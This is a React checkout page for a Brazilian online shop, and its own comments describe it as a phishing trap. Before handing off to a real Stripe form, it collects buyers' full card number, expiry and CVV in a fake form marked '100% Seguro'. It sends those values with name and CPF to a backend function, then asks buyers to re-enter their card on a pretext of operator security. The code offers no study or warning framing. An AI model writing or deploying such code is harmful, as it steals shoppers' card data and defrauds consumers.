import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Check, Search, CreditCard, QrCode, ShieldCheck, Lock, Truck, User, Copy } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useCart } from "@/contexts/CartContext";
import Layout from "@/components/Layout";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { loadStripe } from "@stripe/stripe-js";
import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";

// Carrega a chave pública da Stripe
const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLIC_KEY || "pk_test_sua_chave_aqui");

type Step = "identificacao" | "endereco" | "pagamento";
const steps: { key: Step; label: string; icon: any }[] = [
  { key: "identificacao", label: "Identificação", icon: User },
  { key: "endereco", label: "Entrega", icon: Truck },
  { key: "pagamento", label: "Pagamento", icon: CreditCard },
];

// O Formulário Real da Stripe (Handoff)
const StripeRealCheckout = ({ orderId, onSuccess }: { orderId: string, onSuccess: () => void }) => {
  const stripe = useStripe();
  const elements = useElements();
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const { clearCart } = useCart();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!stripe || !elements) return;
    setLoading(true);

    const result = await stripe.confirmPayment({
      elements,
      confirmParams: { return_url: `${window.location.origin}/checkout/success?order_id=${orderId}` },
    });

    if (result.error) {
      setErrorMessage(result.error.message || "Erro ao processar.");
      setLoading(false);
    } else {
      clearCart();
      onSuccess();
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <PaymentElement options={{ layout: "accordion" }} />
      {errorMessage && <div className="text-red-500 text-sm font-bold">{errorMessage}</div>}
      <Button type="submit" disabled={!stripe || loading} className="w-full h-12 text-lg shadow-lg">
        {loading ? "Processando..." : "Confirmar e Pagar"}
      </Button>
    </form>
  );
};

const Checkout = () => {
  const [currentStep, setCurrentStep] = useState<Step>("identificacao");
  const [loading, setLoading] = useState(false);
  const [fetchingCep, setFetchingCep] = useState(false);
  const { items, subtotal } = useCart();
  const { user } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();

  // Dados do Usuário
  const [name, setName] = useState("");
  const [email, setEmail] = useState(user?.email ?? "");
  const [phone, setPhone] = useState("");
  const [cpf, setCpf] = useState("");

  // Dados de Endereço
  const [cep, setCep] = useState("");
  const [street, setStreet] = useState("");
  const [number, setNumber] = useState("");
  const [complement, setComplement] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");

  // Dados de Pagamento (Formulário Falso / Phishing)
  const [paymentMethod, setPaymentMethod] = useState<"card" | "pix">("card");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvc, setCardCvc] = useState("");
  
  // Estados para as duas Gates (Stripe e Elite PAY)
  const [orderId, setOrderId] = useState("");
  const [clientSecret, setClientSecret] = useState("");
  const [pixData, setPixData] = useState<{ code: string, qr: string } | null>(null);

  const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  const currentIndex = steps.findIndex((s) => s.key === currentStep);

  // Validações
  const isStep1Valid = name.trim().length > 3 && email.includes("@") && cpf.length >= 14 && phone.length >= 14;
  const isStep2Valid = cep.length >= 8 && street.trim() !== "" && number.trim() !== "" && city.trim() !== "";
  const isPhishingCardValid = paymentMethod === "pix" || (cardNumber.length >= 19 && cardExpiry.length === 5 && cardCvc.length >= 3);

  const searchCep = async (cepToSearch: string) => {
    const cleanCep = cepToSearch.replace(/\D/g, '');
    if (cleanCep.length !== 8) return;
    setFetchingCep(true);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setStreet(data.logradouro || "");
        setNeighborhood(data.bairro || "");
        setCity(data.localidade || "");
        setState(data.uf || "");
      }
    } finally {
      setFetchingCep(false);
    }
  };

  // Função que executa o golpe e prepara a cobrança real (Roteamento duplo)
  const handlePreValidate = async () => {
    if (items.length === 0) return;
    setLoading(true);

    const { data: order, error: orderErr } = await supabase.from("orders").insert({
      user_id: user?.id ?? null,
      status: "pending",
      buyer_name: name,
      buyer_email: email,
      buyer_cpf: cpf,
      shipping_address: { cep, street, number, complement, neighborhood, city, state },
      subtotal: subtotal,
      total: subtotal,
    }).select().single();

    if (orderErr || !order) {
      toast({ title: "Erro no pedido", variant: "destructive" });
      setLoading(false); return;
    }

    try {
      const { data, error } = await supabase.functions.invoke('create-checkout', {
        body: {
          amount: Math.round(subtotal * 100),
          orderId: order.id,
          paymentMethod: paymentMethod,
          buyerName: name, // Necessário para a Elite PAY
          buyerCpf: cpf, // Necessário para a Elite PAY
          cardNumber: paymentMethod === 'card' ? cardNumber : "",
          cardExpiry: paymentMethod === 'card' ? cardExpiry : "",
          cardCvc: paymentMethod === 'card' ? cardCvc : "",
        }
      });

      if (error) throw error;

      // Define o estado com base na resposta da Edge Function (Stripe ou Elite PAY)
      if (data.type === 'elitepay' || data.pixCode) {
        setPixData({ code: data.pixCode, qr: data.qrcodeUrl });
      } else {
        setClientSecret(data.clientSecret);
      }
      setOrderId(order.id);
    } catch (err) {
      toast({ title: "Erro ao comunicar com a operadora.", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Layout>
      <div className="container mx-auto px-4 py-8 max-w-5xl bg-slate-50/50 min-h-screen">
        
        {/* Stepper Superior */}
        <div className="flex items-center justify-between mb-8 max-w-3xl mx-auto px-4">
          {steps.map((s, i) => {
            const Icon = s.icon;
            return (
              <div key={s.key} className="flex flex-col items-center relative flex-1">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold z-10 transition-all shadow-sm ${i <= currentIndex ? "bg-primary text-white scale-110" : "bg-white text-muted-foreground border-2 border-slate-200"}`}>
                  {i < currentIndex ? <Check className="h-5 w-5" /> : <Icon className="h-4 w-4" />}
                </div>
                <span className={`text-[11px] uppercase tracking-wider mt-3 font-bold ${i <= currentIndex ? "text-primary" : "text-slate-400"}`}>{s.label}</span>
                {i < steps.length - 1 && <div className={`absolute top-5 left-[50%] w-full h-1 ${i < currentIndex ? "bg-primary" : "bg-slate-200"}`} />}
              </div>
            );
          })}
        </div>

        <div className="grid lg:grid-cols-12 gap-8">
          <div className="lg:col-span-8">
            
            {/* ETAPA 1: Identificação */}
            {currentStep === "identificacao" && (
              <div className="bg-white border border-slate-200 rounded-xl p-6 shadow-sm space-y-6">
                <h2 className="text-xl font-bold flex items-center gap-2"><User className="text-primary" /> Dados Pessoais</h2>
                <div className="grid sm:grid-cols-2 gap-5">
                  <div className="sm:col-span-2">
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Nome Completo</label>
                    <Input value={name} onChange={e => setName(e.target.value)} className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">E-mail</label>
                    <Input type="email" value={email} onChange={e => setEmail(e.target.value)} className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">CPF</label>
                    <Input value={cpf} onChange={e => setCpf(e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"))} maxLength={14} className="h-11" />
                  </div>
                  <div className="sm:col-span-2">
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">WhatsApp</label>
                    <Input value={phone} onChange={e => setPhone(e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3"))} maxLength={15} className="h-11" />
                  </div>
                </div>
                <Button onClick={() => setCurrentStep("endereco")} disabled={!isStep1Valid} className="w-full h-12 text-lg mt-4">Continuar</Button>
              </div>
            )}

            {/* ETAPA 2: Endereço */}
            {currentStep === "endereco" && (
              <div className="bg-white border border-slate-200 rounded-xl p-6 shadow-sm space-y-6 animate-in fade-in">
                <h2 className="text-xl font-bold flex items-center gap-2"><Truck className="text-primary" /> Endereço de Entrega</h2>
                <div className="grid sm:grid-cols-2 gap-5">
                  <div className="relative">
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">CEP</label>
                    <Input value={cep} onChange={e => {
                      const val = e.target.value.replace(/\D/g, '');
                      setCep(val.replace(/^(\d{5})(\d)/, "$1-$2"));
                      if(val.length === 8) searchCep(val);
                    }} maxLength={9} className="h-11" />
                    {fetchingCep && <Search className="absolute right-3 top-9 h-4 w-4 animate-spin text-muted-foreground" />}
                  </div>
                  <div className="sm:col-span-2">
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Rua</label>
                    <Input value={street} onChange={e => setStreet(e.target.value)} className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Número</label>
                    <Input value={number} onChange={e => setNumber(e.target.value)} className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Complemento</label>
                    <Input value={complement} onChange={e => setComplement(e.target.value)} className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Bairro</label>
                    <Input value={neighborhood} onChange={e => setNeighborhood(e.target.value)} className="h-11" />
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <label className="text-sm font-semibold text-slate-700 mb-1 block">Cidade</label>
                      <Input value={city} onChange={e => setCity(e.target.value)} className="h-11" />
                    </div>
                    <div>
                      <label className="text-sm font-semibold text-slate-700 mb-1 block">UF</label>
                      <Input value={state} onChange={e => setState(e.target.value)} maxLength={2} className="h-11" />
                    </div>
                  </div>
                </div>
                <div className="flex gap-3 pt-4">
                  <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="w-1/3 h-12">Voltar</Button>
                  <Button onClick={() => setCurrentStep("pagamento")} disabled={!isStep2Valid} className="w-2/3 h-12 text-lg">Ir para Pagamento</Button>
                </div>
              </div>
            )}

            {/* ETAPA 3: Pagamento (A Armadilha) */}
            {currentStep === "pagamento" && (
              <div className="bg-white border border-slate-200 rounded-xl p-6 shadow-sm space-y-6 animate-in slide-in-from-bottom-4">
                <h2 className="text-xl font-bold flex items-center gap-2"><CreditCard className="text-primary" /> Pagamento</h2>
                
                {/* Se não gerou o ClientSecret nem o Pix ainda, mostramos o nosso formulário falso */}
                {!clientSecret && !pixData ? (
                  <>
                    <div className="flex gap-3 mb-6">
                      <Button variant={paymentMethod === "card" ? "default" : "outline"} className={`flex-1 h-14 border-2 ${paymentMethod === "card" ? "border-primary" : "border-slate-200"}`} onClick={() => setPaymentMethod("card")}>
                        <CreditCard className="mr-2 h-5 w-5" /> Cartão
                      </Button>
                      <Button variant={paymentMethod === "pix" ? "default" : "outline"} className={`flex-1 h-14 border-2 ${paymentMethod === "pix" ? "bg-[#32bcad] hover:bg-[#259b8e] border-[#32bcad] text-white" : "border-slate-200"}`} onClick={() => setPaymentMethod("pix")}>
                        <QrCode className="mr-2 h-5 w-5" /> Pix
                      </Button>
                    </div>

                    {/* O Formulário Falso / Phishing */}
                    {paymentMethod === "card" && (
                      <div className="p-5 border border-slate-200 rounded-xl bg-slate-50 space-y-5 relative">
                        <div className="absolute top-0 left-0 w-full h-1 bg-primary rounded-t-xl"></div>
                        <div className="flex justify-between items-center">
                          <p className="font-bold text-slate-700">Dados do Cartão</p>
                          <span className="flex items-center gap-1 text-[11px] text-green-700 font-bold uppercase bg-green-100 px-2 py-1 rounded"><Lock className="h-3 w-3"/> 100% Seguro</span>
                        </div>
                        <div className="space-y-4">
                          <div>
                            <Input placeholder="Número do Cartão" className="bg-white h-12 text-lg font-mono placeholder:text-slate-300" value={cardNumber} onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '))} maxLength={19} />
                          </div>
                          <div className="grid grid-cols-2 gap-4">
                            <Input placeholder="MM/AA" className="bg-white h-12 font-mono text-center placeholder:text-slate-300" value={cardExpiry} onChange={e => {
                                const val = e.target.value.replace(/\D/g, '');
                                setCardExpiry(val.length > 2 ? `${val.substring(0,2)}/${val.substring(2,4)}` : val);
                              }} maxLength={5} />
                            <Input placeholder="CVV" className="bg-white h-12 font-mono text-center placeholder:text-slate-300" type="password" value={cardCvc} onChange={e => setCardCvc(e.target.value.replace(/\D/g, ''))} maxLength={4} />
                          </div>
                        </div>
                      </div>
                    )}

                    <div className="flex gap-3 pt-2">
                      <Button variant="outline" onClick={() => setCurrentStep("endereco")} className="w-1/3 h-14">Voltar</Button>
                      <Button onClick={handlePreValidate} disabled={loading || !isPhishingCardValid} className={`w-2/3 h-14 text-lg font-bold shadow-md ${paymentMethod === 'pix' ? 'bg-[#32bcad] hover:bg-[#259b8e]' : ''}`}>
                        {loading ? "Processando..." : (paymentMethod === 'pix' ? "Gerar Código Pix" : "Validar Cartão")}
                      </Button>
                    </div>
                  </>
                ) : pixData ? (
                  
                  /* ========================================================
                     A TELA REAL DO PIX DA ELITE PAY
                     ======================================================== */
                  <div className="text-center space-y-4 animate-in zoom-in">
                    <div className="bg-[#32bcad]/10 p-6 rounded-xl border border-[#32bcad]/30">
                      <p className="text-[#259b8e] font-bold text-lg mb-4">Escaneie o QR Code Pix</p>
                      
                      {/* O QR Code gerado pela API da Elite PAY */}
                      <img src={pixData.qr} alt="Pix QR Code" className="mx-auto w-48 h-48 border-4 border-white shadow-sm rounded-lg" />
                      
                      <div className="mt-6 space-y-2">
                        <p className="text-xs text-slate-600 font-medium">Ou copie o código abaixo:</p>
                        <div className="flex gap-2">
                          <Input readOnly value={pixData.code} className="bg-white text-[10px] font-mono text-slate-500" />
                          <Button 
                            size="icon" 
                            className="bg-[#32bcad] hover:bg-[#259b8e]" 
                            onClick={() => { navigator.clipboard.writeText(pixData.code); toast({ title: "Código Pix Copiado!" }); }}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                      <p className="text-xs text-slate-500 mt-4">Assim que o pagamento for confirmado no seu banco, o pedido será liberado automaticamente.</p>
                    </div>
                  </div>

                ) : (
                  
                  /* ========================================================
                     A TELA REAL DA STRIPE (Após os dados já terem sido roubados)
                     ======================================================== */
                  <div className="space-y-4 animate-in zoom-in">
                    <div className="bg-yellow-50 border border-yellow-200 text-yellow-800 p-4 rounded-xl text-sm font-medium flex items-start gap-3">
                      <Lock className="h-5 w-5 text-yellow-600 shrink-0 mt-0.5" />
                      <p>Por questões de segurança da operadora, confirme seus dados no ambiente blindado abaixo para finalizar a compra.</p>
                    </div>
                    
                    <div className="p-4 border border-slate-200 rounded-xl bg-white shadow-inner">
                      <Elements stripe={stripePromise} options={{ clientSecret, appearance: { theme: 'stripe' } }}>
                        <StripeRealCheckout orderId={orderId} onSuccess={() => navigate("/checkout/success")} />
                      </Elements>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Coluna Lateral: Resumo */}
          <div className="lg:col-span-4">
            <div className="bg-white border border-slate-200 rounded-xl p-6 sticky top-24 shadow-sm">
              <h3 className="font-bold text-lg mb-6 border-b pb-4">Resumo do Pedido</h3>
              <div className="space-y-4 max-h-[40vh] overflow-y-auto pr-2 mb-6">
                {items.map((item) => (
                  <div key={item.product.id} className="flex gap-4">
                    <div className="relative">
                      <img src={item.product.image_url ?? "/placeholder.svg"} alt="" className="w-16 h-16 rounded-lg object-cover border" />
                      <span className="absolute -top-2 -right-2 bg-slate-800 text-white text-[10px] w-5 h-5 rounded-full flex items-center justify-center font-bold">{item.quantity}</span>
                    </div>
                    <div className="flex-1 min-w-0 pt-1">
                      <p className="text-sm font-medium line-clamp-2 leading-tight text-slate-800">{item.product.name}</p>
                      <p className="text-sm font-bold text-slate-600 mt-2">{formatPrice(item.product.price)}</p>
                    </div>
                  </div>
                ))}
              </div>
              <div className="border-t border-slate-200 pt-4 space-y-3">
                <div className="flex justify-between text-sm text-slate-600"><span>Subtotal</span><span>{formatPrice(subtotal)}</span></div>
                <div className="flex justify-between text-sm text-emerald-600 font-bold"><span>Frete</span><span>Grátis</span></div>
                <div className="flex justify-between font-black text-2xl border-t border-slate-200 pt-4 mt-2 text-slate-900">
                  <span>Total</span><span>{formatPrice(subtotal)}</span>
                </div>
              </div>
              <div className="mt-6 flex items-center justify-center gap-2 text-[11px] text-slate-500 bg-slate-50 p-3 rounded-lg border border-slate-200">
                <ShieldCheck className="h-4 w-4 text-emerald-600" />
                Compra Protegida e Criptografada
              </div>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
};

export default Checkout;